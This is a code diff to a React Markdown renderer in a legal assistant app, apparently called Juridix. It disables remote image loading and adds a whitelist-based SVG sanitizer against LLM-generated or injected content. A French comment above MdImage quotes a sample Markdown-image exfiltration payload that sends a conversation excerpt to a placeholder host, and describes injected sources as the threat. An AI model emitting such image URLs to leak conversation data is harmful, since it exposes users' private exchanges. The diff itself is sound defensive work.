@@ -34,12 +34,12 @@ class VisualErrorBoundary extends React.Component<{ label: string; children: Rea
 // (Excalidraw supprimé — remplacé par renderer SVG natif, voir SvgBlock ci-dessous)
 import type { Components } from 'react-markdown';
 import type { Element } from 'hast';
-import { API_BASE } from '../constants';
 import { mergeEChartsOption, cleanEChartsCode } from '../utils/text';
 import { sanitizeMermaid } from '../utils/mermaid-sanitizer';
 import * as echarts from 'echarts';
 import mermaid from 'mermaid';
 
+import { CitationBadge, parseCiteHref } from './CitationBadge';
 // ── Mermaid initialization (once) ────────────────────────────────────────────
 // ── Mermaid theme — synchronisé avec les variables CSS de l'app ─────────────
 // Light  : bg-primary=#ffffff  text-primary=#111111  border-medium=rgba(0,0,0,0.16)
@@ -176,71 +176,19 @@ function getMermaidSandbox(): HTMLElement {
   return el;
 }
 
-// ── Image proxy wikimedia ──────────────────────────────────────────────────
-async function resolveImageUrl(rawSrc: string): Promise<string | null> {
-  if (!rawSrc) return null;
-  const wikiFileMatch = rawSrc.match(/commons\.wikimedia\.org\/wiki\/File:(.+)/i);
-  if (wikiFileMatch) {
-    const filename = decodeURIComponent(wikiFileMatch[1]);
-    try {
-      const apiUrl = `https://commons.wikimedia.org/w/api.php?action=query&titles=File:${encodeURIComponent(filename)}&prop=imageinfo&iiprop=url&format=json&origin=*`;
-      const res = await fetch(apiUrl);
-      const data = await res.json();
-      const pages: Record<string, { imageinfo?: Array<{ url: string }> }> = data?.query?.pages || {};
-      for (const page of Object.values(pages)) {
-        const url = page?.imageinfo?.[0]?.url;
-        if (url) return url;
-      }
-    } catch { /* ignore */ }
-    return rawSrc;
-  }
-  return rawSrc;
-}
-
+// ── Images Markdown ─────────────────────────────────────────────────────────
+// Juridix n'affiche AUCUNE image distante ni inline : une image Markdown produite
+// par le LLM (ou injectée par un document / une source piégée) ne doit jamais
+// déclencher de requête réseau, car l'URL peut servir de canal d'exfiltration
+// (`![x](https://hote/?d=<extrait de la conversation>)`). On rend donc
+// uniquement le texte alternatif, de façon inerte (ni lien, ni <img>).
+// La CSP (`img-src 'self' data: blob:`) le garantit aussi côté WebView.
 interface MdImageProps { src?: string; alt?: string; }
 
-export function MdImage({ src: rawSrc, alt }: MdImageProps) {
-  const [resolvedSrc, setResolvedSrc] = useState<string | null>(null);
-  const [errored, setErrored]         = useState(false);
-  const [loading, setLoading]         = useState(true);
-
-  useEffect(() => {
-    if (!rawSrc) return;
-    setErrored(false);
-    setLoading(true);
-
-    // Les data-URLs (base64 inline) sont auto-contenues — pas de proxy
-    if (rawSrc.startsWith('data:')) {
-      setResolvedSrc(rawSrc);
-      setLoading(false);
-      return;
-    }
-
-    resolveImageUrl(rawSrc).then(url => {
-      if (!url) { setResolvedSrc(null); setLoading(false); return; }
-      // Les URLs localhost (Garage, services locaux) sont accessibles directement
-      // depuis le navigateur — pas besoin de proxy.
-      const isLocal = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\]|[^/]*\.localhost)(:\d+)?/.test(url);
-      const resolved = isLocal
-        ? url
-        : `${API_BASE}/api-proxy/api/image-proxy?url=${encodeURIComponent(url)}`;
-      setResolvedSrc(resolved);
-      setLoading(false);
-    });
-  }, [rawSrc]);
-
-  if (loading) return <span className="md-img-wrap md-img-loading">⏳ Chargement de l'image…</span>;
-  if (errored || !resolvedSrc) {
-    return (
-      <a className="md-img-fallback md-link" href={rawSrc} target="_blank" rel="noopener noreferrer">
-        🖼 {alt || rawSrc}
-      </a>
-    );
-  }
+export function MdImage({ alt }: MdImageProps) {
   return (
-    <span className="md-img-wrap">
-      <img className="md-img" src={resolvedSrc} alt={alt || ''} onError={() => setErrored(true)} loading="lazy" />
-      {alt && <span className="md-img-caption">{alt}</span>}
+    <span className="md-img-fallback" title="Image non affichée (Juridix n'affiche pas d'images)">
+      🖼 {alt || 'image non affichée'}
     </span>
   );
 }
@@ -420,12 +368,76 @@ function ScreenshotBlock({ raw }: ScreenshotBlockProps) {
 // Affiche le SVG avec zoom/pan natif et contrôles de copie/téléchargement.
 interface SvgBlockProps { code: string; streaming?: boolean; }
 
-/** Sanitise le SVG et force quelques attributs de sécurité/qualité */
+// Éléments SVG autorisés (liste blanche). Tout le reste — <script>,
+// <foreignObject>, <iframe>, <animate>/<set> (qui peuvent réécrire un href),
+// <a>, <image>… — est supprimé avec son contenu.
+const SVG_ALLOWED_TAGS = new Set([
+  'svg', 'g', 'defs', 'symbol', 'use', 'title', 'desc', 'style',
+  'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon',
+  'text', 'tspan', 'textpath',
+  'lineargradient', 'radialgradient', 'stop', 'pattern', 'clippath', 'mask', 'marker',
+  'filter', 'feblend', 'fecolormatrix', 'fecomponenttransfer', 'fecomposite',
+  'feconvolvematrix', 'fediffuselighting', 'fedisplacementmap', 'fedropshadow',
+  'feflood', 'fefunca', 'fefuncb', 'fefuncg', 'fefuncr', 'fegaussianblur',
+  'femerge', 'femergenode', 'femorphology', 'feoffset', 'fespecularlighting',
+  'fetile', 'feturbulence', 'fedistantlight', 'fepointlight', 'fespotlight',
+]);
+
+/** Retire d'un texte CSS ce qui permet de charger des ressources externes. */
+function cleanSvgCss(css: string): string {
+  return css
+    .replace(/@import[^;]*;?/gi, '')
+    .replace(/url\(\s*(['"]?)(?!#)[^)]*\)/gi, 'none')
+    .replace(/expression\s*\(/gi, '')
+    .replace(/javascript:/gi, '');
+}
+
+/**
+ * Nettoie un SVG non fiable (généré par le LLM) en travaillant sur le DOM,
+ * pas par regex : liste blanche d'éléments, suppression de tous les attributs
+ * d'événements (on*), des href/xlink:href qui ne pointent pas vers un id local,
+ * et des url() externes dans les styles.
+ */
+export function sanitizeSvgMarkup(raw: string): string {
+  // Le parseur HTML est tolérant aux SVG mal formés (contrairement au XML strict).
+  const doc = new DOMParser().parseFromString(raw, 'text/html');
+  const root = doc.querySelector('svg');
+  if (!root) return '';
+
+  // NB : `Element` désigne ici le type hast importé plus haut → on type le DOM explicitement.
+  type DomEl = HTMLElement | SVGElement;
+  const walk = (el: DomEl) => {
+    for (const child of Array.from(el.children) as DomEl[]) {
+      const tag = child.localName.toLowerCase();
+      if (!SVG_ALLOWED_TAGS.has(tag)) {
+        child.remove();
+        continue;
+      }
+      if (tag === 'style') {
+        child.textContent = cleanSvgCss(child.textContent ?? '');
+      }
+      walk(child);
+    }
+    for (const attr of Array.from(el.attributes)) {
+      const name = attr.name.toLowerCase();
+      const value = attr.value;
+      if (name.startsWith('on')) { el.removeAttribute(attr.name); continue; }
+      if (name === 'href' || name === 'xlink:href') {
+        if (!value.trim().startsWith('#')) el.removeAttribute(attr.name);
+        continue;
+      }
+      if (/javascript:|data:text\/html/i.test(value)) { el.removeAttribute(attr.name); continue; }
+      if (name === 'style') el.setAttribute(attr.name, cleanSvgCss(value));
+    }
+  };
+  walk(root);
+  return root.outerHTML;
+}
+
+/** Sanitise le SVG et force quelques attributs de qualité d'affichage */
 function sanitizeSvg(raw: string): string {
-  let s = raw
-    .replace(/<script[\s\S]*?<\/script>/gi, '')
-    .replace(/\s+on\w+="[^"]*"/gi, '')
-    .replace(/\s+on\w+='[^']*'/gi, '');
+  let s = sanitizeSvgMarkup(raw);
+  if (!s) throw new Error('SVG invalide ou vide après nettoyage');
 
   // Supprimer width/height absolus — le CSS prend le relais via width:100%/height:auto
   s = s.replace(/(<svg\b[^>]*)\s+width="[0-9.]+(?:px|pt|cm|in|em|rem)?"/i, '$1');
@@ -565,7 +577,12 @@ export function makeMdComponents(streaming: boolean): Components {
     em:         ({ children }: { children?: React.ReactNode })                      => <em className="md-em">{children}</em>,
     blockquote: ({ children }: { children?: React.ReactNode })                      => <blockquote className="md-blockquote">{children}</blockquote>,
     hr:         ()                                                                   => <hr className="md-hr" />,
-    a:          ({ href, children }: { href?: string; children?: React.ReactNode }) => <a className="md-link" href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
+    a:          ({ href, children }: { href?: string; children?: React.ReactNode }) => {
+      // Référence d'article vérifiée (chantier 4) : badge inline plutôt que lien ordinaire.
+      const cite = parseCiteHref(href);
+      if (cite !== null) return <CitationBadge index={cite}>{children}</CitationBadge>;
+      return <a className="md-link" href={href} target="_blank" rel="noopener noreferrer">{children}</a>;
+    },
     table:      ({ children }: { children?: React.ReactNode })                      => <div className="md-table-wrap"><table className="md-table">{children}</table></div>,
     thead:      ({ children }: { children?: React.ReactNode })                      => <thead className="md-thead">{children}</thead>,
     tbody:      ({ children }: { children?: React.ReactNode })                      => <tbody>{children}</tbody>,
